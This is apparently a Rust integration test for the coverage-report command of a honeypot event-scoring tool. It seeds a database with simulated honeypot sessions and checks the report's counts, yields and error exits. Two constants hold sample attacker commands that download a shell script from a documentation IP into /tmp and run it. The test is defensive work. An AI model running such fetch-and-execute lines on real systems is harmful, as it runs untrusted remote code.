//! `propolis coverage` reads the event database and prints the report, then exits. The binary
//! runs with an environment holding nothing but `DATABASE_URL`: the daemon would refuse to start
//! without its sensor and console settings and would never return, so a clean exit with a report
//! on stdout shows no daemon, listener or supervisor was started.

use std::process::{Command, Output};

use core_scoring::{EventInput, Protocol, SignalType, append_event};
use sensor_framework::Uuid;
use serde_json::json;
use sqlx::PgPool;

const FETCH_A: &str = "wget http://203.0.113.5/a.sh -O /tmp/Qw3Er5Ty7U; sh /tmp/Qw3Er5Ty7U";
const FETCH_B: &str = "wget http://198.51.100.9/zz/b.sh -O /tmp/Mn8Bv6Cx4Z; sh /tmp/Mn8Bv6Cx4Z";

async fn migrate(pool: &PgPool) {
    sqlx::migrate!("../core-scoring/migrations")
        .run(pool)
        .await
        .unwrap();
}

/// A URL for the same per-test database the pool points at, on the server `DATABASE_URL` names.
fn url_for(pool: &PgPool) -> String {
    let base = std::env::var("DATABASE_URL").unwrap();
    let base = base.split('?').next().unwrap();
    let (server, _) = base.rsplit_once('/').unwrap();
    format!(
        "{server}/{}",
        pool.connect_options().get_database().unwrap()
    )
}

fn event(
    signal: SignalType,
    second: u32,
    metadata: serde_json::Value,
    session: u128,
) -> EventInput {
    EventInput::from_signal(
        "203.0.113.7".parse().unwrap(),
        None,
        "sensor-a".into(),
        signal,
        Protocol::Tcp,
        true,
        format!("2026-10-01T10:00:{second:02}Z").parse().unwrap(),
        metadata,
        Some(Uuid::from_u128(session)),
    )
}

fn exec(session: u128, second: u32, class: &str, base: &str, command: &str) -> EventInput {
    event(
        SignalType::HoneypotCommandExec,
        second,
        json!({"classification": class, "command_basename": base, "command": command}),
        session,
    )
}

async fn seed(pool: &PgPool) {
    let events = [
        // s1 and s2: wget, then a download. s3: wget, nothing after (a login came BEFORE it).
        exec(1, 10, "partial", "wget", "wget http://203.0.113.5/a"),
        event(SignalType::HoneypotFileDownload, 20, json!({}), 1),
        exec(2, 10, "partial", "wget", "wget http://203.0.113.5/a"),
        event(SignalType::HoneypotFileDownload, 20, json!({}), 2),
        event(SignalType::HoneypotLoginAttempt, 5, json!({}), 3),
        exec(3, 10, "partial", "wget", "wget http://203.0.113.5/a"),
        // One unknown family across s1 (followed by an upload) and s3 (nothing after).
        exec(1, 30, "unknown", "wget", FETCH_A),
        event(SignalType::HoneypotMalwareUpload, 40, json!({}), 1),
        exec(3, 30, "parse_limit", "wget", FETCH_B),
        exec(3, 31, "supported", "uname", "uname -a"),
    ];
    for e in events {
        append_event(pool, e).await.unwrap();
    }
}

fn coverage(url: Option<&str>, args: &[&str]) -> Output {
    let mut cmd = Command::new(env!("CARGO_BIN_EXE_propolis"));
    cmd.arg("coverage").args(args).env_clear();
    if let Some(url) = url {
        cmd.env("DATABASE_URL", url);
    }
    cmd.output().unwrap()
}

#[sqlx::test(migrations = false)]
async fn prints_the_json_report_with_classes_families_and_yields(pool: PgPool) {
    migrate(&pool).await;
    seed(&pool).await;
    let out = coverage(Some(&url_for(&pool)), &["--json"]);
    assert!(
        out.status.success(),
        "{}",
        String::from_utf8_lossy(&out.stderr)
    );
    let report: serde_json::Value = serde_json::from_slice(&out.stdout).unwrap();

    assert_eq!(
        report["class_counts"],
        json!({"supported": 1, "partial": 3, "unknown": 1, "parse_limit": 1})
    );
    // wget: 5 commands over 3 sessions; s1 and s2 reach a later stage, s3 does not.
    let wget = &report["basenames"][0];
    assert_eq!(wget["name"], "wget");
    assert_eq!(wget["count"], 5);
    let y = wget["yield_later_stage"].as_f64().unwrap();
    assert!((y - 2.0 / 3.0).abs() < 1e-9, "{y}");
    let uname = report["basenames"]
        .as_array()
        .unwrap()
        .iter()
        .find(|b| b["name"] == "uname")
        .unwrap();
    assert_eq!(uname["yield_later_stage"], 0.0);

    let families = report["unknown_families"].as_array().unwrap();
    assert_eq!(families.len(), 1);
    assert_eq!(
        families[0]["shape"],
        "wget http://<URL> -O /tmp/<NAME>; sh /tmp/<NAME>"
    );
    assert_eq!(families[0]["count"], 2);
    assert_eq!(families[0]["classes"]["unknown"], 1);
    assert_eq!(families[0]["classes"]["parse_limit"], 1);
    // Sessions s1 (upload after) and s3 (nothing after): one of two.
    assert_eq!(families[0]["yield_later_stage"], 0.5);
    // Raw examples are an explicit opt-in.
    assert_eq!(families[0]["example"], "");
    assert!(report["generated_at"].is_string());
    assert!(report["window"].is_null());
}

#[sqlx::test(migrations = false)]
async fn prints_a_table_and_opts_in_to_examples_and_a_window(pool: PgPool) {
    migrate(&pool).await;
    seed(&pool).await;
    let url = url_for(&pool);

    let out = coverage(Some(&url), &[]);
    assert!(
        out.status.success(),
        "{}",
        String::from_utf8_lossy(&out.stderr)
    );
    let text = String::from_utf8(out.stdout).unwrap();
    assert!(
        text.contains("commands: 6 (supported 1, partial 3, unknown 1, parse_limit 1)"),
        "{text}"
    );
    assert!(text.contains("66.7%  wget"), "{text}");
    assert!(
        text.contains("50.0%  unknown=1 parse_limit=1  wget http://<URL>"),
        "{text}"
    );
    assert!(!text.contains("example:"), "{text}");
    assert!(!text.contains("starting unified daemon"), "{text}");

    let out = coverage(Some(&url), &["--examples"]);
    let text = String::from_utf8(out.stdout).unwrap();
    // The family example is its lexicographically smallest member.
    assert!(text.contains(&format!("example: {FETCH_B}")), "{text}");

    // The window cuts at event time: only seconds 0..=9 hold the s3 login.
    let out = coverage(Some(&url), &["--json", "--until", "2026-10-01T10:00:09Z"]);
    let report: serde_json::Value = serde_json::from_slice(&out.stdout).unwrap();
    assert_eq!(report["class_counts"]["partial"], 0);
    assert_eq!(report["window"]["to"], "2026-10-01T10:00:09Z");
    assert!(report["window"]["from"].is_null());
}

#[sqlx::test(migrations = false)]
async fn an_empty_database_prints_an_empty_report_and_exits_zero(pool: PgPool) {
    migrate(&pool).await;
    let out = coverage(Some(&url_for(&pool)), &["--json"]);
    assert!(
        out.status.success(),
        "{}",
        String::from_utf8_lossy(&out.stderr)
    );
    let report: serde_json::Value = serde_json::from_slice(&out.stdout).unwrap();
    assert_eq!(
        report["class_counts"],
        json!({"supported": 0, "partial": 0, "unknown": 0, "parse_limit": 0})
    );
    assert_eq!(report["basenames"], json!([]));
    assert_eq!(report["unknown_families"], json!([]));
}

#[test]
fn failures_go_to_stderr_with_a_nonzero_exit() {
    let out = coverage(None, &[]);
    assert_eq!(out.status.code(), Some(1));
    assert!(out.stdout.is_empty());
    assert!(String::from_utf8_lossy(&out.stderr).contains("DATABASE_URL is not set"));

    // Nothing listens on port 1: the connect fails fast instead of falling through to the daemon.
    let out = coverage(Some("postgres://postgres@127.0.0.1:1/none"), &[]);
    assert_eq!(out.status.code(), Some(1));
    assert!(out.stdout.is_empty());
    assert!(String::from_utf8_lossy(&out.stderr).contains("cannot connect"));

    let out = coverage(None, &["--since", "yesterday"]);
    assert_eq!(out.status.code(), Some(2));
    assert!(out.stdout.is_empty());
    assert!(String::from_utf8_lossy(&out.stderr).contains("usage: propolis coverage"));
}
